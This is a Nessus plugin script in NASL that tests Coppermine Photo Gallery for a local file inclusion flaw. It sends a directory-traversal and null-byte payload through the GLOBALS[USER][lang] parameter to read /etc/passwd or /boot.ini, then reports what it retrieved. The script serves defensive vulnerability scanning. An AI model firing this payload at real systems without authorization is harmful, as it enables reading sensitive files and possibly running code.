#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(38879);
  script_version("$Revision: 1.10 $");
script_cvs_date("$Date: 2015/09/24 21:08:38 $");
  script_osvdb_id(54582);

  script_xref(name:"EDB-ID", value:"8713");
  script_xref(name:"EDB-ID", value:"8736");
  script_xref(name:"Secunia", value:"35144");

  script_name(english:"Coppermine Photo Gallery GLOBALS[USER[lang] Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute( attribute:"synopsis",  value:
"The remote web server contains a PHP script that is affected by a
local file inclusion vulnerability."  );
  script_set_attribute( attribute:"description",  value:
"The version of Coppermine Photo Gallery installed on the remote host
fails to filter user-supplied input to the 'GLOBALS[USER][lang]'
parameter of the 'index.php' script before using it to include PHP
code in 'includes/init.inc.php'.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker can exploit this issue
to view arbitrary files or possibly to execute arbitrary PHP code on
the remote host subject to the privileges of the web server user id.

Note that this install is also likely to be affected by several SQL
injection vulnerabilities, although Nessus has not checked for them."  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://forum.coppermine-gallery.net/index.php/topic,59551.0.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Upgrade to Coppermine Photo Gallery version 1.4.23 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/05/25");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:coppermine:coppermine_photo_gallery");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("coppermine_gallery_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');
files = make_list(files, "include/crop.inc.php");

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";
file_pats['include/crop.inc.php'] = "(function cropCheck|cropAction\.php\?pop=1)";


# Test an install.
install = get_kb_item(string("www/", port, "/coppermine_photo_gallery"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  id = rand_str();

  disable_cookiejar();

  # Loop through files to look for.
  foreach file (files)
  {
    if (file[0] == '/') traversal = crap(data:"../", length:3*9) + '..';
    else traversal = '../';

    if (substr(file, strlen(file)-4) == ".php")
      exploit = string(traversal, substr(file, 0, strlen(file)-4-1));
    else
      exploit = string(traversal, file, "%00");

   url = string(
      dir, "/index.php?",
      "GLOBALS[USER][ID]=", hexstr(MD5(id)), "&",
      "GLOBALS[USER][lang]=", exploit
    );

    # Try to exploit the issue.
    req = http_mk_get_req(
      port : port,
      item : url
    );
    req['Accept-Language'] = NULL;     # this must be removed!

    res = http_send_recv_req(port:port, req:req);
    if (isnull(res)) exit(0);

    # There's a problem if we see the expected contents.
    body = res[2];
    file_pat = file_pats[file];
    if (egrep(pattern:file_pat, string:body))
    {
      if (report_verbosity > 0)
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        req_str = http_mk_buffer_from_req(req:req);
        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          req_str, "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
        if (report_verbosity > 1)
        {
          contents = body;
          if ("<!DOCTYPE" >< contents) contents = contents - strstr(contents, "<!DOCTYPE");
          report += string(
            "\n",
            "Here are its contents :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            contents, "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
